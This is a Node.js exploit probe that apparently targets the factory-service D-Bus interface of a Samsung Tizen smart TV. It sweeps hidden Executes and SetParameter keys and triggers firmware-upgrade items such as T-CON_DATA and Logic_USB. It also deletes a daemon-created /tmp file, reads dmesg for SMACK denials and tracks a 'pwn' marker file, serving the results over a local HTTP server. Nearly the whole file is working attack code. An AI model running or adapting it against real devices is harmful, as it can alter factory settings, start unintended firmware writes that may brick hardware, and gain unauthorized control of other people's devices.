'use strict';
var http = require('http');
var fs = require('fs');
var cp = require('child_process');

var PORT = 8185;
var PROBE_FILE = '/home/owner/share/tmp/sdk_tools/tbprobe96h.txt';
var PWN = '/tmp/pwn96h.txt';

var L = [
  'var fs = require("fs");',
  'var cp = require("child_process");',
  'var r = {};',

  // 1. Pre-create pwn file
  'try { fs.writeFileSync("' + PWN + '", "pre\\n"); r.pwn_precreated = true; } catch(e) {}',

  // 2. Read /tmp/vconf_ready — KEY TEST: can we read kfactoryd-created files?
  'try {',
  '  r.vconf_ready_content = fs.readFileSync("/tmp/vconf_ready","utf8").trim().slice(0,500);',
  '  r.vconf_ready_readable = true;',
  '} catch(e) { r.vconf_ready_err = e.message.slice(0,80); }',
  'try {',
  '  var vst = fs.statSync("/tmp/vconf_ready");',
  '  r.vconf_ready_stat = { size: vst.size, mtime: vst.mtime };',
  '} catch(e) { r.vconf_ready_stat_err = e.message.slice(0,60); }',

  // 3. Check /tmp fully — stat everything we can
  'r.tmp_full = [];',
  'try {',
  '  var tmp_all = fs.readdirSync("/tmp");',
  '  r.tmp_full = tmp_all;',
  '} catch(e) {}',

  // 4. GetFString(16) full content (feature flags)
  'try {',
  '  var o_fs16 = cp.spawnSync("gdbus",["call","--system","--dest","org.tizen.tv.factory-service","--object-path","/TIFacSerObj","--method","org.tizen.tv.factoryservice.GetFString","16"],{timeout:5000});',
  '  r.fstring_16_full = (o_fs16.stdout||new Buffer(0)).toString().trim().slice(0,3000);',
  '} catch(e) {}',

  // 5. GetFString(0..10) full content
  'r.fstrings_0_10 = {};',
  'for (var ft = 0; ft <= 10; ft++) {',
  '  try {',
  '    var o_ft = cp.spawnSync("gdbus",["call","--system","--dest","org.tizen.tv.factory-service","--object-path","/TIFacSerObj","--method","org.tizen.tv.factoryservice.GetFString",String(ft)],{timeout:3000});',
  '    var ftout = (o_ft.stdout||new Buffer(0)).toString().trim();',
  '    r.fstrings_0_10["ft"+ft] = ftout.slice(0,500);',
  '  } catch(e) {}',
  '}',

  // 6. Executes sweep 26..60 — find more executable keys
  'r.exec_sweep_26_60 = {};',
  'var dmesg_base2 = 0;',
  'try { dmesg_base2 = cp.spawnSync("dmesg",[],{timeout:3000}).stdout.toString().split("\\n").length; } catch(e) {}',
  'for (var ek = 26; ek <= 60; ek++) {',
  '  try {',
  '    var o_ek = cp.spawnSync("gdbus",["call","--system","--dest","org.tizen.tv.factory-service","--object-path","/TIFacSerObj","--method","org.tizen.tv.factoryservice.Executes",String(ek),"0"],{timeout:3000});',
  '    var ekout = (o_ek.stdout||new Buffer(0)).toString().trim();',
  '    if (ekout && ekout !== "(1,)" && ekout !== "((-1,),)" && ekout !== "((-4,),)") {',
  '      r.exec_sweep_26_60["k"+ek] = ekout.slice(0,100);',
  '    }',
  '  } catch(e) {}',
  '}',

  // 7. SetParameter sweep on upgrade sub-items + Executes
  'r.upgrade_setparam = {};',
  'var upg_keys = [10804, 90804, 160804, 240804, 250804, 20804, 30804, 40804, 50804, 60804, 70804, 80804];',
  'var upg_names = ["T-CON_DATA","Logic_USB","Function","Pic_Data_USB","Upgrade_STR","k20804","k30804","k40804","k50804","k60804","k70804","k80804"];',
  'upg_keys.forEach(function(uk, ui) {',
  '  try {',
  '    var o_sp = cp.spawnSync("gdbus",["call","--system","--dest","org.tizen.tv.factory-service","--object-path","/TIFacSerObj","--method","org.tizen.tv.factoryservice.SetParameter",String(uk),"1"],{timeout:4000});',
  '    var sp_out = (o_sp.stdout||new Buffer(0)).toString().trim().slice(0,80);',
  '    r.upgrade_setparam[upg_names[ui]] = { set: sp_out };',
  '    if (sp_out.indexOf("(0,)") > -1) {',
  '      var o_ex = cp.spawnSync("gdbus",["call","--system","--dest","org.tizen.tv.factory-service","--object-path","/TIFacSerObj","--method","org.tizen.tv.factoryservice.Executes",String(uk),"0"],{timeout:8000});',
  '      r.upgrade_setparam[upg_names[ui]].exec = (o_ex.stdout||new Buffer(0)).toString().trim().slice(0,100);',
  '    }',
  '  } catch(e) {}',
  '});',

  // 8. SetParameter on VCONF dump key (52803) with value=1 then execute
  'try {',
  '  var o_vsp = cp.spawnSync("gdbus",["call","--system","--dest","org.tizen.tv.factory-service","--object-path","/TIFacSerObj","--method","org.tizen.tv.factoryservice.SetParameter","52803","1"],{timeout:4000});',
  '  r.vconf_setparam = (o_vsp.stdout||new Buffer(0)).toString().trim().slice(0,80);',
  '} catch(e) {}',

  // 9. Delete /tmp/vconf_ready, re-run VCONF dump, check if it reappears
  'var vconf_existed_before = false;',
  'try {',
  '  fs.unlinkSync("/tmp/vconf_ready");',
  '  r.vconf_unlinked = true;',
  '} catch(e) { r.vconf_unlink_err = e.message.slice(0,60); }',
  'try {',
  '  var o_vd = cp.spawnSync("gdbus",["call","--system","--dest","org.tizen.tv.factory-service","--object-path","/TIFacSerObj","--method","org.tizen.tv.factoryservice.Executes","52803","0"],{timeout:12000});',
  '  r.vconf_reexec = (o_vd.stdout||new Buffer(0)).toString().trim().slice(0,100);',
  '} catch(e) {}',
  'try { r.vconf_reappeared = fs.existsSync("/tmp/vconf_ready"); } catch(e) {}',
  'try { r.vconf_reread = fs.readFileSync("/tmp/vconf_ready","utf8").trim().slice(0,200); } catch(e) { r.vconf_reread_err = e.message.slice(0,60); }',

  // 10. Remaining hidden children 50..76
  'r.hidden_50_76 = [];',
  'for (var hi = 50; hi <= 76; hi++) {',
  '  try {',
  '    var o_hc = cp.spawnSync("gdbus",["call","--system","--dest","org.tizen.tv.factory-service","--object-path","/TIFacSerObj","--method","org.tizen.tv.factoryservice.GetChildItem","5",String(hi)],{timeout:3000});',
  '    var hout = (o_hc.stdout||new Buffer(0)).toString().trim();',
  '    r.hidden_50_76.push({ idx: hi, data: hout.slice(0,200) });',
  '  } catch(e) {}',
  '}',

  // 11. GetItem(6..11) — might be more root items
  'r.root_items_6_11 = {};',
  'for (var ri = 6; ri <= 11; ri++) {',
  '  try {',
  '    var o_ri = cp.spawnSync("gdbus",["call","--system","--dest","org.tizen.tv.factory-service","--object-path","/TIFacSerObj","--method","org.tizen.tv.factoryservice.GetItem",String(ri)],{timeout:3000});',
  '    r.root_items_6_11["k"+ri] = (o_ri.stdout||new Buffer(0)).toString().trim().slice(0,200);',
  '  } catch(e) {}',
  '}',

  // 12. Dmesg — check for new SMACK denials (vconf_ready access attempt)
  'try {',
  '  var o_dm = cp.spawnSync("dmesg",[],{timeout:5000});',
  '  var dm_all = (o_dm.stdout||new Buffer(0)).toString().split("\\n");',
  '  var new_dm = dm_all.slice(dmesg_base2).filter(function(l){ return l.indexOf("audit")>-1||l.indexOf("denied")>-1||l.indexOf("factory")>-1||l.indexOf("kfac")>-1||l.indexOf("vconf")>-1; });',
  '  r.dmesg_new = new_dm.join("\\n").slice(0,2000);',
  '  r.dmesg_tail20 = dm_all.slice(-20).join("\\n").slice(0,1500);',
  '} catch(e) {}',

  // 13. Final pwn check
  'try { r.pwn_final = fs.readFileSync("' + PWN + '","utf8").trim(); } catch(e) { r.pwn_err = e.message.slice(0,60); }',

  'var out = JSON.stringify(r,null,2);',
  'try { fs.writeFileSync("' + PROBE_FILE + '",out); } catch(e2) {}',
  'process.stdout.write(out);'
];

var INNER = L.join('\n');

function runProbe(cb) {
  cp.execFile(process.execPath, ['-e', INNER], { timeout: 180000 }, function(err, stdout, stderr) {
    if (err) {
      cb(JSON.stringify({ exec_error: err.message.slice(0,200), stderr: (stderr||'').slice(0,500) }));
    } else {
      cb(stdout || '{}');
    }
  });
}

var server = http.createServer(function(req, res) {
  runProbe(function(out) {
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(out);
  });
});

server.on('error', function(e) {
  try { fs.writeFileSync(PROBE_FILE, JSON.stringify({ server_err: e.message })); } catch(e2) {}
});

server.listen(PORT, '127.0.0.1', function() {
  runProbe(function(out) {
    try { fs.writeFileSync(PROBE_FILE, out); } catch(e) {}
  });
});

setInterval(function() {}, 60000);
